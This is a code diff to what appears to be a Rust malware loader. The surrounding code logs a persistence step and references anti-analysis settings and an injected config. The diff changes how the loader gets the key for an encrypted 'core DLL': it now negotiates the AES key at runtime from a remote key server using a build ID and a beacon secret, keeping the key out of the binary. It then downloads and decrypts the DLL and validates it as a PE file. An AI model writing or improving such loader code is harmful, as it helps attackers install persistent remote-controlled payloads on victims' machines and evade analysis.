@@ -165,31 +165,34 @@ fn main() {
     }
     log!("[7/10] persistence done");
 
-    // 6. Load core DLL bytes (production: download + decrypt)
-    log!("[8/10] decrypting AES key...");
-    let mut aes_key = match dll_fetch::decrypt_aes_key(&loader_cfg.encrypted_aes_key, &loader_cfg.rsa_private_key) {
-        Ok(k) => {
-            log!("[8/10] AES key decrypted OK ({} bytes)", k.len());
-            k
-        }
-        Err(e) => fatal_exit(&format!("[8/10] FAIL: AES key decrypt: {}", e)),
-    };
-
+    // 6. Negotiate core AES key at runtime (no embedded private key), then
+    //    download + decrypt the core DLL.
+    log!("[8/10] negotiating core AES key...");
     let download_url = loader_cfg.download_url();
+    let key_server_url = loader_cfg.server_url.clone();
+    let key_path = loader_cfg.core_key_path.clone();
+    let build_id = loader_cfg.build_id();
+    let beacon_secret = loader_cfg.beacon_secret.clone();
     log!("[9/10] downloading core from {}...", download_url);
 
-    let aes_key_clone = aes_key.clone();
     let download_result = std::thread::spawn(move || {
         let rt = tokio::runtime::Builder::new_current_thread()
             .enable_all()
             .build()
             .map_err(|e| format!("tokio runtime: {}", e))?;
 
+        let mut aes_key = rt.block_on(dll_fetch::handshake_core_key(
+            &key_server_url, &key_path, &build_id, &beacon_secret))
+            .map_err(|e| format!("handshake: {}", e))?;
+
         let encrypted = rt.block_on(dll_fetch::download_core(&download_url))
             .map_err(|e| format!("download: {}", e))?;
 
-        let decrypted = dll_fetch::decrypt_dll(&encrypted, &aes_key_clone)
+        let decrypted = dll_fetch::decrypt_dll(&encrypted, &aes_key)
             .map_err(|e| format!("decrypt: {}", e))?;
+
+        use zeroize::Zeroize;
+        aes_key.zeroize();
 
         Ok::<(Vec<u8>, usize), String>((decrypted, encrypted.len()))
     }).join().unwrap_or(Err("download thread panic".into()));
@@ -201,9 +204,6 @@ fn main() {
         }
         Err(e) => fatal_exit(&format!("[9/10] FAIL: {}", e)),
     };
-
-    use zeroize::Zeroize;
-    aes_key.zeroize();
 
     // 9. Validate PE header (basic sanity check)
     if dll_bytes.len() < 64 {
@@ -247,7 +247,7 @@ fn fatal_exit(msg: &str) -> ! {
 
 // ── Config Injection ──────────────────────────────────────────────────
 
-use libra_common::models::{AntiAnalysisConfig, InjectedConfig, CONFIG_MAGIC};
+use libra_common::models::{InjectedConfig, CONFIG_MAGIC};
 
 fn parse_injected_config() -> Option<(InjectedConfig, String)> {
     let exe_path = env::current_exe().ok()?;
